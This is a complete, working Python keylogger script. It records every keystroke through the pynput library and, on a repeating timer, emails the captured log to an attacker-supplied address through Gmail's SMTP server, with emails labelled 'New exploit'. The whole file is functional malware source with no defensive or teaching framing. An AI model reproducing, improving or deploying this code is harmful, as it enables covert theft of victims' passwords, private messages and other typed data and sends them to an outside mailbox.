#!/usr/bin/env python3
import pynput.keyboard
import threading
from email.message import EmailMessage
import smtplib
import argparse
import random
import string


def create_email(recipient, email_text):
    """
    Creates an email using the EmailMessage class. Return email class
    """
    msg = EmailMessage()
    msg['Subject'] = f'New exploit - %s' % ''.join(random.choices(string.ascii_letters, k=5))
    msg['From'] = recipient
    msg['To'] = recipient
    msg.set_content(email_text)
    return msg


def send_mail(email_text, recipient, password):
    """
    Sends the email_text to the recipient. Auth using password. No exceptions raised. No return.
    """
    msg = create_email(recipient, email_text)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    try:
        server.ehlo()
        server.starttls()
        server.login(user=recipient, password=password)
        server.send_message(msg)
    except Exception as e:
        server.quit()
        return
    finally:
        server.quit()


class KeyLogger:

    def __init__(self, recipient, password, interval):
        self.recipient = recipient
        self.password = password
        self.keyboard_listener = pynput.keyboard.Listener(on_press=self.handle_keypress)
        self.log = ''
        self.interval = interval
        self.loop = 0
        send_mail('Key Logger started: interval of {} seconds.'.format(self.interval), recipient, password)
        self.main()

    def handle_keypress(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == key.space:
                self.log += ' '
            else:
                self.log += ' ' + str(key) + ' '
        self.loop += 1

    def report(self):
        send_mail(self.log, self.recipient, self.password)
        self.log = ''
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def main(self):
        with self.keyboard_listener:
            self.report()
            self.keyboard_listener.join()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-e', dest='email', help='Email to send the key logger logs.', required=True)
    parser.add_argument('-p', dest='password', help='Email password.', required=True)
    parser.add_argument('-i', dest='interval', help='(Optional) Email time interval in seconds. Default to 300. ',
                        type=int, default=300)
    args = parser.parse_args()
    KeyLogger(args.email, args.password, args.interval)
